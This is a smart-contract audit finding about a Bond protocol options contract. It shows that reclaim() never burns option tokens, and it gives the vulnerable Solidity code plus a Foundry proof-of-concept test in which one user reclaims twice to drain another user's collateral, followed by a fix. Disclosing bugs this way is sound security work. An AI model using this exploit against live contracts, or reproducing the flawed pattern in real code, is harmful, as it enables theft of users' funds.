# Findings:
| | Findings | Severity | Link to Original Report |
|-|-|-|-|
| 01. | Attacker can Steal Other User's Collateral  | High | [Link](https://github.com/sherlock-audit/2023-06-bond-judging/issues/73) |

## H-01. Attacker can Steal Other User's Collateral
### Summary
The FixedStrikeOptionTeller.sol contract contains a vulnerability that allows an attacker to steal collateral from other users after their options have expired. The issue lies in the reclaim function, which is responsible for allowing users to claim their collateral if they choose not to exercise the option.

### Vulnerability Detail
When a user triggers the reclaim() function, the total supply of the option token is stored in an "amount" variable, and the corresponding amount is transferred to the receiver. However, the option token is not burned during this operation. As a result, if the function is called multiple times by the receiver, the total supply remains the same and it repeatedly transfers the same amount to the receiver, ultimately draining the entire balance.

### Impact
This vulnerability enables an attacker to exhaust the balance of other users who have not reclaimed their collateral after the expiration of their options.

### Code Snippet
https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L395
```
    function reclaim(FixedStrikeOptionToken optionToken_) external override nonReentrant {
        // Load option parameters
        (
            ERC20 payoutToken,
            ERC20 quoteToken,
            uint48 eligible,
            uint48 expiry,
            address receiver,
            bool call,
            uint256 strikePrice
        ) = optionToken_.getOptionParameters();

        // Retrieve the internally stored option token with this configuration
        // Reverts internally if token doesn't exist
        FixedStrikeOptionToken optionToken = getOptionToken(
            payoutToken,
            quoteToken,
            eligible,
            expiry,
            receiver,
            call,
            strikePrice
        );

        // Revert if token does not match stored token
        if (optionToken_ != optionToken) revert Teller_UnsupportedToken(address(optionToken_));

        // Revert if not expired
        if (uint48(block.timestamp) < expiry) revert Teller_NotExpired(expiry);

        // Revert if caller is not receiver
        if (msg.sender != receiver) revert Teller_NotAuthorized();

        // Transfer remaining collateral to receiver
        uint256 amount = optionToken.totalSupply();
        if (call) {
            payoutToken.safeTransfer(receiver, amount);
        } else {
            // Calculate amount of quote tokens equivalent to amount at strike price
            uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());
            quoteToken.safeTransfer(receiver, quoteAmount);
        }
    }
```

### Tool used
Manual Review
Foundry

### Proof of Concept:
Add the test to the existing setUp and run it.
```
    function test_double_reclaim() public {
        // Deploy call option token with receiver as alice.
        uint256 strikePrice = 5 * 10 ** def.decimals();
        FixedStrikeOptionToken optionToken = teller.deploy(
            abc,
            def,
            uint48(0),
            uint48(block.timestamp + 8 days),
            alice,
            false,
            strikePrice
        );

        //Deploy call option token with receiver as bob.
        FixedStrikeOptionToken optionToken1 = teller.deploy(
            abc,
            def,
            uint48(0),
            uint48(block.timestamp + 8 days),
            bob,
            false,
            strikePrice
        );

        uint256 amount = 100 * 10 ** abc.decimals();

        // Alice and Bob Mints option tokens by depositing collateral (quote tokens)
        vm.prank(alice);
        teller.create(optionToken, amount);

        vm.prank(bob);
        teller.create(optionToken1, amount);

        // Warp forward past expiry
        vm.warp(block.timestamp + 9 days);


        //Alice reclaims twice, effectively stealing Bob's Collateral.
        vm.startPrank(alice);
        teller.reclaim(optionToken);
        teller.reclaim(optionToken); 
        vm.stopPrank();
    }
```

### Recommendation
Burn the Option Token in the reclaim function.